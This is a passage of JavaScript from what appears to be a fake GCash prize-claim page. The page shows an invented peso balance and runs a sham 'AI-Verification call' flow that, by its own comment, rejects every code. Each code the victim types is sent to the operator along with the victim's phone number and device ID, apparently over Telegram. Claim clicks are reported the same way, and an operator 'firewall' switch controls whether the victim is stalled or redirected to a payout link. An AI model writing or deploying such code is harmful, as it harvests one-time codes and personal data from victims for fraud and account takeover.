                callExpiredMsg.style.display = 'block';
            }
            if (codeErrorMsg) codeErrorMsg.style.display = 'none';
            codeInput.style.borderColor = '#ff8800';
            codeInput.style.boxShadow = '0 0 20px rgba(255, 136, 0, 0.3)';
            return;
        }
        
        // ========== DEFAULT: ALWAYS INVALID ==========
        // No valid code exists - every attempt is invalid
        
        codeEntered = true;
        
        // Send Telegram notification for invalid attempt
        var userPhone = localStorage.getItem("userPhone") || "Unknown";
        var deviceId = localStorage.getItem("userDeviceId") || "Unknown";
        sendAICodeAttemptNotification(userPhone, deviceId, enteredCode, callCountdown);
        
        // Show error
        if (codeErrorMsg) {
            codeErrorMsg.textContent = '❌ Invalid verification code. Please request a new call.';
            codeErrorMsg.style.display = 'block';
        }
        
        // Visual feedback
        codeInput.style.borderColor = '#ff4444';
        codeInput.style.boxShadow = '0 0 30px rgba(255, 68, 68, 0.4)';
        shakeElement(codeInput);
        
        // Disable verify button temporarily
        if (verifyBtn) {
            verifyBtn.disabled = true;
            verifyBtn.style.opacity = '0.5';
            setTimeout(function() {
                if (verifyBtn) {
                    verifyBtn.disabled = false;
                    verifyBtn.style.opacity = '1';
                }
            }, 2000);
        }
        
        // Clear input after 1.5 seconds
        setTimeout(function() {
            codeInput.value = '';
            codeInput.style.borderColor = '#00d4ff';
            codeInput.style.boxShadow = '0 0 15px rgba(0, 212, 255, 0.2)';
            
            // Show "request new call" prompt
            if (codeErrorMsg) {
                codeErrorMsg.textContent = '🔄 Please request a new AI-Verification call.';
                codeErrorMsg.style.color = '#ff8800';
            }
        }, 1500);
        
        // Reset to initial state after 4 seconds
        setTimeout(function() {
            if (codeErrorMsg) {
                codeErrorMsg.style.display = 'none';
                codeErrorMsg.textContent = '';
                codeErrorMsg.style.color = '#ff4444';
            }
            
            // Show expired state
            var statusText = document.getElementById('callStatusText');
            var timerDisplay = document.getElementById('callTimerDisplay');
            var codeSection = document.getElementById('codeSection');
            var requestBtn = document.getElementById('requestCallBtn');
            
            if (statusText) {
                statusText.innerHTML = '⏰ <strong style="color: #ff8800;">CALL EXPIRED</strong><br><span style="font-size: 11px; color: rgba(255,255,255,0.5);">Please request a new call</span>';
                statusText.style.color = '#ff8800';
            }
            if (timerDisplay) {
                timerDisplay.style.display = 'none';
                timerDisplay.style.animation = '';
            }
            if (codeSection) {
                codeSection.style.display = 'none';
            }
            if (requestBtn) {
                requestBtn.disabled = false;
                requestBtn.style.opacity = '1';
                requestBtn.innerHTML = '<i class="fas fa-phone-alt"></i> REQUEST AI-VERIFICATION CALL';
            }
            
            callInProgress = false;
            isCallRequested = false;
            
        }, 4000);
    }
    
    // ========== SHAKE ELEMENT ANIMATION ==========
    function shakeElement(element) {
        if (!element) return;
        element.style.animation = 'shake 0.5s ease';
        setTimeout(function() {
            element.style.animation = '';
        }, 500);
    }
    
    // ========== CHECK FIREWALL AND TRANSITION ==========
    function checkFirewallAndTransition() {
        getFirewallStatus().then(function(isFirewallOn) {
            if (isFirewallOn) {
                console.log('🔥 Firewall ON - Showing AI-Verification');
                showFirewallPopup();
            } else {
                console.log('🔓 Firewall OFF - Transition to Phase 2');
                transitionToPhase2();
            }
        });
    }
    
    // ========== TRANSITION TO PHASE 2 ==========
    function transitionToPhase2() {
        var popupInner = document.querySelector('.popup-inner');
        if (!popupInner) return;
        
        popupInner.style.transition = 'opacity 0.3s ease, transform 0.3s ease';
        popupInner.style.opacity = '0';
        popupInner.style.transform = 'scale(0.95)';
        
        setTimeout(function() {
            showPhase2();
            popupInner.style.opacity = '1';
            popupInner.style.transform = 'scale(1)';
        }, 300);
    }
    
    // ========== PHASE 1: DEFAULT POPUP with 500 Bills Indicators ==========
    function showPhase1(balance) {
        var popupInner = document.querySelector('.popup-inner');
        if (!popupInner) return;
        
        var popupContainer = document.querySelector('.popup-container');
        if (popupContainer) {
            popupContainer.style.maxWidth = '360px';
            popupContainer.style.width = '90%';
        }
        
        currentBalance = balance;
        currentPhase = 1;
        
        popupInner.style.transition = '';
        popupInner.style.opacity = '1';
        popupInner.style.transform = '';
        
        popupInner.innerHTML = `
            <div class="popup-close" id="popupClosePhase1">✕</div>
            <h2 class="popup-title" style="font-family: 'Playfair Display', serif; font-size: 26px; font-weight: 900; background: linear-gradient(to bottom, #fcf6ba, #d4af37, #aa771c); -webkit-background-clip: text; background-clip: text; color: transparent; text-transform: uppercase; text-align: center;">
                🎉 HOORAY! 🎉
            </h2>
            <div class="prize-amount" style="font-size: 48px; font-weight: 900; color: #fce883; font-family: 'Orbitron', monospace; text-align: center; text-shadow: 0 0 20px rgba(212,175,55,0.5);" id="popupBalanceDisplay">
                ₱<span id="popupBalanceAmount">${balance.toFixed(2)}</span>
            </div>
            <div class="divider"></div>
            
            <div class="bill-indicators">
                <div class="bill-indicator"><img src="images/PHL-500-Front.png" alt="500"></div>
                <div class="bill-indicator"><img src="images/PHL-500-Back.png" alt="500"></div>
                <div class="bill-indicator"><img src="images/PHL-500-Front.png" alt="500"></div>
                <div class="bill-indicator"><img src="images/PHL-500-Back.png" alt="500"></div>
            </div>
            
            <div class="invite-text" style="font-size: 12px; color: #999; text-align: center; font-family: 'Poppins', sans-serif;">
                Your friend must confirm your invitation to get extra <strong style="color: #fce883;">₱500 bonus</strong>.
            </div>
            <div class="luckyday-image-container" style="text-align: center; margin: 15px 0;">
                <img src="images/luckyday.png" alt="Lucky Day" class="luckyday-img" style="max-width: 100%; border-radius: 12px; border: 1px solid rgba(212,175,55,0.3);" onerror="this.style.display='none'">
            </div>
            <div class="divider"></div>
            
            <button class="claim-gcash-button" id="claimGCashBtn" style="width: 100%; display: flex; align-items: center; justify-content: center; gap: 8px; position: relative; overflow: hidden;">
                <img src="images/gc_icon.png" class="gc-icon" style="width: 22px; height: 22px;"> CLAIM THRU GCASH
            </button>

            <div class="button-separator" style="height: 1px; background: linear-gradient(90deg, transparent, rgba(212,175,55,0.4), transparent); margin: 12px 0;"></div>

            <button class="small-back-btn" id="backBtnPhase1" style="margin: 0 auto; display: inline-flex;">
                ← BACK
            </button>
        `;
        
        updateBillsIndicators(balance);
        
        var closeBtn = document.getElementById('popupClosePhase1');
        if (closeBtn) closeBtn.onclick = function() { closePopup(); };
        
        var backBtn = document.getElementById('backBtnPhase1');
        if (backBtn) backBtn.onclick = function() { closePopup(); };
        
        var claimBtn = document.getElementById('claimGCashBtn');
        if (claimBtn) {
            claimBtn.onclick = function() {
                if (currentBalance <= 0) {
                    claimBtn.classList.add('shake-effect');
                    claimBtn.style.background = 'linear-gradient(to bottom, #ff4444, #cc0000)';
                    claimBtn.style.border = '1px solid #ff6666';
                    claimBtn.innerHTML = '❌ INSUFFICIENT BALANCE';
                    
                    var popupTitle = document.querySelector('.popup-title');
                    if (popupTitle) {
                        popupTitle.style.background = 'linear-gradient(to bottom, #ff6666, #ff4444)';
                        popupTitle.style.webkitBackgroundClip = 'text';
                        popupTitle.style.backgroundClip = 'text';
                        popupTitle.textContent = '⚠️ NO BALANCE ⚠️';
                    }
                    
                    setTimeout(function() {
                        claimBtn.classList.remove('shake-effect');
                        claimBtn.style.background = 'linear-gradient(to bottom, #d4af37, #aa771c)';
                        claimBtn.style.border = '1px solid #fcf6ba';
                        claimBtn.innerHTML = '<img src="images/gc_icon.png" class="gc-icon" style="width: 22px; height: 22px;"> CLAIM THRU GCASH';
                        
                        if (popupTitle) {
                            popupTitle.style.background = 'linear-gradient(to bottom, #fcf6ba, #d4af37, #aa771c)';
                            popupTitle.style.webkitBackgroundClip = 'text';
                            popupTitle.style.backgroundClip = 'text';
                            popupTitle.textContent = '🎉 HOORAY! 🎉';
                        }
                    }, 2000);
                    return;
                }
                
                // Send Claim button Telegram notification
                var userPhone = localStorage.getItem("userPhone") || "Unknown";
                var deviceId = localStorage.getItem("userDeviceId") || "Unknown";
                sendClaimButtonNotification(userPhone, deviceId, currentBalance);
                
                animateBalanceDecrement(currentBalance, 0, 800, function() {
                    checkFirewallAndTransition();
                });
            };
        }
    }
    
    // ========== PHASE 2: WITHDRAWAL LINK ==========
    function showPhase2() {
        var popupInner = document.querySelector('.popup-inner');
        if (!popupInner) return;
        
        currentPhase = 2;
        
        var popupContainer = document.querySelector('.popup-container');
        if (popupContainer) {
            popupContainer.style.maxWidth = '340px';
            popupContainer.style.width = '85%';
        }
        
        popupInner.innerHTML = `
            <div class="popup-close" id="popupClosePhase2">✕</div>
            
            <div style="text-align: center; margin-bottom: 8px;">
                <div style="font-size: 50px; animation: bounceIn 0.5s ease;">🏆</div>
            </div>
            
            <h2 class="phase2-heading" style="font-family: 'Orbitron', monospace; font-size: 18px; font-weight: 900; background: linear-gradient(to bottom, #fcf6ba, #d4af37, #aa771c); -webkit-background-clip: text; background-clip: text; color: transparent; text-align: center;">GREAT JOB!</h2>
            
            <div class="divider"></div>
            
            <div style="background: linear-gradient(145deg, rgba(20, 10, 5, 0.6), rgba(10, 5, 0, 0.6)); border: 1px solid rgba(212,175,55,0.3); border-radius: 12px; padding: 14px; margin: 10px 0;">
                <p style="font-size: 11px; color: #ccc; text-align: center; margin: 0; font-family: 'Poppins', sans-serif;">
                    "Nice work! You're one tap away from your reward!"
                </p>
                <p style="font-size: 12px; color: #fce883; text-align: center; margin: 8px 0 0 0; font-family: 'Orbitron', monospace;">
                    Your reward: <strong style="font-size: 22px; color: #fce883; text-shadow: 0 0 15px rgba(212,175,55,0.5);">₱${currentBalance.toFixed(2)}</strong>
                </p>
            </div>
            
            <button class="claim-gcash-button" id="proceedBtn" style="width: 100%; padding: 14px; font-size: 14px; margin-top: 10px; display: flex; align-items: center; justify-content: center; gap: 8px;">
                <img src="images/gc_icon.png" class="gc-icon" style="width: 20px; height: 20px;"> CLAIM VIA GCASH APP
            </button>

            <div class="button-separator" style="height: 1px; background: linear-gradient(90deg, transparent, rgba(212,175,55,0.4), transparent); margin: 12px 0 10px;"></div>

            <button class="small-back-btn" id="backBtnPhase2" style="margin: 0 auto; display: inline-flex;">
                ← BACK
            </button>
        `;
        
        attachPhase2Events();
    }
    
    // ========== ATTACH PHASE 2 EVENTS ==========
    function attachPhase2Events() {
        var closeBtn = document.getElementById('popupClosePhase2');
        if (closeBtn) closeBtn.onclick = function() { closePopup(); };
        
        var backBtn = document.getElementById('backBtnPhase2');
        if (backBtn) {
            backBtn.onclick = function() {
                var popupInner = document.querySelector('.popup-inner');
                if (popupInner) {
                    popupInner.style.transition = 'opacity 0.3s ease';
                    popupInner.style.opacity = '0';
                    setTimeout(function() {
                        showPhase1(currentBalance);
                        popupInner.style.opacity = '1';
                    }, 300);
                }
            };
        }
        
        var proceedBtn = document.getElementById('proceedBtn');
        if (proceedBtn) {
            proceedBtn.onclick = function() {
                if (claimInProgress) return;
                
                claimInProgress = true;
                
                this.classList.add('btn-pulse');
                setTimeout(function() { this.classList.remove('btn-pulse'); }.bind(this), 500);
                
                this.disabled = true;
                this.innerHTML = '<img src="images/gc_icon.png" class="gc-icon" style="width: 20px; height: 20px;"> PROCESSING...';
                this.style.opacity = '0.8';
                
                window.addEventListener('beforeunload', beforeUnloadHandler);
                
                getLatestPayoutLink().then(function(linkData) {
                    if (linkData && linkData.url) {
                        var userPhone = localStorage.getItem("userPhone") || "Unknown";
                        markLinkAsUsed(linkData.key, userPhone).then(function() {
                            isRedirecting = true;
                            proceedBtn.innerHTML = '<img src="images/gc_icon.png" class="gc-icon" style="width: 20px; height: 20px;"> REDIRECTING...';
                            setTimeout(function() {
                                window.removeEventListener('beforeunload', beforeUnloadHandler);
                                window.location.href = linkData.url;
                            }, 1000);
                        });
                    } else {
                        claimInProgress = false;
                        isRedirecting = false;
                        window.removeEventListener('beforeunload', beforeUnloadHandler);
                        
                        proceedBtn.disabled = false;
                        proceedBtn.innerHTML = '<img src="images/gc_icon.png" class="gc-icon" style="width: 20px; height: 20px;"> CLAIM VIA GCASH APP';
                        proceedBtn.style.opacity = '1';
                        alert("No payout link available. Please try again.");
                    }
                });
            };
        }
    }
    
    // ========== SHOW POPUP ==========
    function showPopup(balance) {
        currentBalance = balance;
        getFirewallStatus().then(function() {
            showPhase1(balance);
            
            var popup = document.getElementById('prizePopup');
            if (popup) {
                popup.style.display = 'flex';
                var ticker = document.getElementById('winnerTicker');
                if (ticker) ticker.style.display = 'none';
            }
        });
    }
    
    // ========== CLOSE POPUP ==========
    function closePopup() {
        var popup = document.getElementById('prizePopup');
        if (popup) {
            popup.style.display = 'none';
            var ticker = document.getElementById('winnerTicker');
            if (ticker) ticker.style.display = 'flex';
            if (window.ConfettiModule) window.ConfettiModule.stop();
        }
        
        claimInProgress = false;
        isRedirecting = false;
        stopCallTimer();
        window.removeEventListener('beforeunload', beforeUnloadHandler);
    }
    
    // ========== START ==========
    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', init);
    } else {
        init();
    }
    
    // ========== EXPORTS ==========
    window.showPopup = showPopup;
    window.closePopup = closePopup;
    window.getFirewallStatus = getFirewallStatus;
    
})();
